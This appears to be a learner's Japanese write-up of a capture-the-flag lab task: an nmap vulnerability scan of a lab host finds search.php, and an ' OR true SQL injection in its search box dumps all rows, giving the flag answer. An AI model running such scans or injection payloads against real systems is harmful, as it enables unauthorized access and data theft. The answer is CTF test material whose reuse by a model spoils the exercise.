## ログインするためには、ユーザ名とパスワードが必要です。そのため、次はユーザ名とパスワードを取得したいと考え、他に利用できそうなページがないかを調査します。利用可能な脆弱性が存在するページのファイル名(*.php)、およびそのページに存在する脆弱性を解答してください。
  
`nse`使えるかな？  
  
```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script=vuln -p 80 172.20.15.28
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-06 10:25 JST
Nmap scan report for 172.20.15.28
Host is up (0.017s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.20.15.28
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://172.20.15.28:80/search.php
|     Form id: 
|_    Form action: search.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin_login.php: Possible admin folder
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /admin_login.php: 
|     PHPSESSID: 
|_      httponly flag not set

Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds

```
  
おっ！何かおったぞ  `search.php`
ブラウザで見てみる  
  
```bash
Search Resort

Search keyword example: Honolulu
name	Description	Image
```
  
つか、よく`github`で`Readme`に画像貼り付けてる人いたからいけるもんだと思ってたら、うまくいかない  
こんなとこで時間費やしてる場合じゃないので、見にくいけど先進むことにした。  
↑の感じの検索フィールドがあるサイトに飛べたので、`SQLinjection`か？と思い、取りあえず投げてみる  
  
```bash
Search Resort
' OR true ;
Search keyword example: Honolulu
name	Description	Image
Republic of Maldives 	The Maldives is a tropical country in the Indian Ocean with over 	place
Republic of Maldives 	The Maldives is a tropical country in the Indian Ocean with over 1,000 coral islands and 26 atolls, known for its beaches, blue lagoons and abundant coral reefs. 	Maldives
Da Nang City 	Da Nang is a seaside city in central Vietnam known for its sandy beaches and French colonial harbor history. It is also a popular base for visiting the resort town of Bana Hills, which is located inland in the western part of the city. 	DaNang
Honolulu 	Honolulu is the capital of the state of Hawaii in the United States, located on the southern coast of Oahu, and is the gateway to the Hawaiian Islands.

```
  
よく覚えてなかったけど、取りあえずクエリを`true`にできればいいっしょ！ってことでOK！

## コマンド
```bash
nmap --script=vuln -p 80 172.20.15.28

----------------------------------
SQLinjection -> `' OR true ;

```

## フラグ
`search.php:sqlinjection`
  
SQL構文おぼえなきゃなぁ  
  
  
